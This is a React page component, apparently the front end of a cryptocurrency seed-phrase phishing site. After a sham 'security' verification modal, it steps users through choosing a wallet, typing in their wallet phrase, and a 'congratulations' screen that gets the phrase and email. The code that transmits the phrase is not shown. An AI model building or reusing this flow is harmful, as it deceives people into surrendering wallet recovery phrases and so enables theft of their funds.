// import { useState } from 'react'
// import reactLogo from './assets/react.svg'
// import viteLogo from '/vite.svg'
// import './App.css'

// function App() {
//   const [count, setCount] = useState(0)

//   return (
//     <>
//       <div>
//         <a href="https://vite.dev" target="_blank">
//           <img src={viteLogo} className="logo" alt="Vite logo" />
//         </a>
//         <a href="https://react.dev" target="_blank">
//           <img src={reactLogo} className="logo react" alt="React logo" />
//         </a>
//       </div>
//       <h1>Vite + React</h1>
//       <div className="card">
//         <button onClick={() => setCount((count) => count + 1)}>
//           count is {count}
//         </button>
//         <p>
//           Edit <code>src/App.jsx</code> and save to test HMR
//         </p>
//       </div>
//       <p className="read-the-docs">
//         Click on the Vite and React logos to learn more
//       </p>
//     </>
//   )
// }

// export default App



"use client"

import { useState } from "react"
import SecurityModal from "./components/security-modal"
import WalletSelection from "./components/wallet-selection"
import WalletPhrase from "./components/wallet-phrase"
import Congratulations from "./components/congratulation"

export default function Home() {
  const [currentStep, setCurrentStep] = useState(0)
  const [selectedWallet, setSelectedWallet] = useState("")
  const [walletPhrase, setWalletPhrase] = useState("")
  const [userEmail, setUserEmail] = useState("")

  const steps = ["security-modal", "wallet-selection", "wallet-phrase", "congratulations"]

  const nextStep = () => {
    if (currentStep < steps.length - 1) {
      setCurrentStep(currentStep + 1)
    }
  }

  // Removed TypeScript type annotation for plain React/JS
  const handleWalletSelect = (wallet) => {
    setSelectedWallet(wallet)
    nextStep()
  }

  const handlePhraseSubmit = (phrase) => {
    setWalletPhrase(phrase)
    nextStep()
  }

  return (
    <div className="min-h-screen bg-gray-50">
      {currentStep === 0 && <SecurityModal onVerify={nextStep} />}

      {currentStep === 1 && <WalletSelection onWalletSelect={handleWalletSelect} />}

      {currentStep === 2 && (
        <WalletPhrase
          selectedWallet={selectedWallet}
          onPhraseSubmit={handlePhraseSubmit}
        />
      )}

      {currentStep === 3 && (
        <Congratulations
          walletData={{
            wallet: selectedWallet,
            phrase: walletPhrase,
            email: userEmail,
          }}
        />
      )}
    </div>
  )
}